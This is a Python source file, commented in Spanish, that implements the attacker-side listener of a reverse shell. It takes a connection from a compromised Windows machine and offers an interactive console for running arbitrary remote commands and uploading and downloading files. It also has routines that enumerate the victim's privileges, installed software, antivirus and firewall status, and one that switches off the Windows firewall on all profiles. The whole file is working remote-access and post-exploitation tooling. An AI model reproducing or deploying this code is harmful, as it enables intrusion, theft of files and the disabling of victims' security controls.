import socket
import json
import base64
import subprocess


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for Incoming Connection")
        self.connection, address = listener.accept()
        print("[+] Got a Connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def obtener_usuario_remoto(self):
        try:
            # Ejecutar 'whoami' para obtener el usuario actual en el equipo remoto
            raw_user = self.execute_remotely(["whoami"]).strip()
            
            # Extraer solo la primera parte antes del '\'
            usuario_base = raw_user.split("\\")[0]  # Divide por '\' y toma la primera parte
            print(f"[+] Usuario remoto obtenido: {usuario_base}")
            return usuario_base
        except Exception as e:
            print(f"[-] Error al obtener usuario remoto: {e}")
            return None

    def prueba_uac(self):
        try:
            # Obtener usuario remoto dinámicamente (solo el nombre base)
            usuario_remoto = self.obtener_usuario_remoto()
            if not usuario_remoto:
                return "[-] No se pudo obtener el usuario remoto."

            # Comandos de prueba UAC
            commands = [
                'cmd.exe /c net session && echo [Admin] || echo [Not Admin]',
                'cmd.exe /c whoami /groups | find "Label"',
                f'cmd.exe /c net user "{usuario_remoto}" | find "Local Group"',  # Usar el nombre base extraído
            ]

            results = []
            for cmd in commands:
                try:
                    output = self.execute_remotely([cmd])
                    results.append(f"[+] Output of '{cmd}':\n{output}")
                except Exception as e:
                    results.append(f"[-] Failed to execute '{cmd}': {e}")

            # Combina resultados y guarda en un archivo local
            result = "\n".join(results)
            with open("resultados_uac.txt", "a") as file:
                file.write(result + "\n")
            return "[+] Prueba de UAC completada. Resultado almacenado en resultados_uac.txt"
        except Exception as e:
            return f"[-] Error en Prueba de UAC: {e}"

    def enumeracion_remota_basica(self):
        try:
            # Comandos de enumeración rápida en el equipo remoto
            commands = ["whoami", 
            "hostname", 
            "ipconfig", 
            "powershell.exe -ExecutionPolicy Unrestricted Get-WmiObject -Class Win32_Product | Select-Object Name, Version", 
            "net start"]
            results = []
            for cmd in commands:
                try:
                    output = self.execute_remotely(cmd)
                    results.append(f"[+] Output of '{cmd}':\n{output}")
                except Exception as e:
                    results.append(f"[-] Failed to execute '{cmd}': {e}")

            # Combina resultados y guarda en un archivo local
            result = "\n".join(results)
            with open("enumeracion_basica.txt", "a") as file:
                file.write(result + "\n")
            return "[+] Enumeración rápida remota completada. Resultado almacenado en enumeracion_remota.txt"
        except Exception as e:
            return f"[-] Error en enumeración rápida remota: {e}"

    def enumeracion_remota_avanzada(self):
        try:
            # Comandos de enumeración rápida en el equipo remoto
            commands = [
                "cmd.exe wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct", 
                "cmd.exe powershell -ExecutionPolicy Unrestricted Get-MpComputerStatus | select RealTimeProtectionEnabled", 
                "cmd.exe powershell -ExecutionPolicy Unrestricted Get-NetFirewallProfile | Format-Table Name, Enabled",
                ]
            results = []
            for cmd in commands:
                try:
                    output = self.execute_remotely(cmd)
                    results.append(f"[+] Output of '{cmd}':\n{output}")
                except Exception as e:
                    results.append(f"[-] Failed to execute '{cmd}': {e}")

            # Combina resultados y guarda en un archivo local
            result = "\n".join(results)
            with open("enumeracion_avanzada.txt", "a") as file:
                file.write(result + "\n")
            return "[+] Enumeración rápida remota completada. Resultado almacenado en enumeracion_avanzada.txt"
        except Exception as e:
            return f"[-] Error en enumeración rápida remota: {e}"
    
    def desactivar_seguridad(self):
        try:
            # Comandos de enumeración rápida en el equipo remoto
            commands = [
                "powershell.exe Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False", 
                ""
                ]
            results = []
            for cmd in commands:
                try:
                    output = self.execute_remotely(cmd)
                    results.append(f"[+] Output of '{cmd}':\n{output}")
                except Exception as e:
                    results.append(f"[-] Failed to execute '{cmd}': {e}")

            # Combina resultados y guarda en un archivo local
            result = "\n".join(results)
            return "[+] Seguridad desactivada"
        except Exception as e:
            return f"[-] Error en desactivar Seguridad: {e}"

    def mostrar_ayuda(self):
        ayuda = """
            Comandos disponibles:
            ayuda                   - Muestra este menú de ayuda.
            upload <path>           - Sube un archivo al RHOST.
            download <path>         - Descarga un archivo del RHOST.
            enumeracion_basica      - Ejecuta una enumeración rápida en el equipo remoto y guarda el resultado.
            enumeracion_avanzada    - Ejecuta una enumeración de soluciones de seguridad(AV, FW, etc) en el equipo remoto y guarda el resultado.
            exit                    - Cierra la conexión y termina el programa.
            """
        return ayuda

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "ayuda":
                    print(self.mostrar_ayuda())
                    continue
                elif command[0] == "prueba_uac":
                    result = self.prueba_uac()
                elif command[0] == "enumeracion_basica":
                    result = self.enumeracion_remota_basica()
                elif command[0] == "enumeracion_avanzada":
                    result = self.enumeracion_remota_avanzada()
                elif command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                    result = self.execute_remotely(command)
                elif command[0] == "download":
                    result = self.execute_remotely(command)
                    if "[-] Error " not in result:
                        result = self.write_file(command[1], result)
                                
                else:
                    result = self.execute_remotely(command)
            except Exception as e:
                result = f"[-] Error during command execution: {e}"
            print(result)

# Cambia la IP y puerto según tu configuración
my_listener = Listener("0.0.0.0", 1234)
my_listener.run()

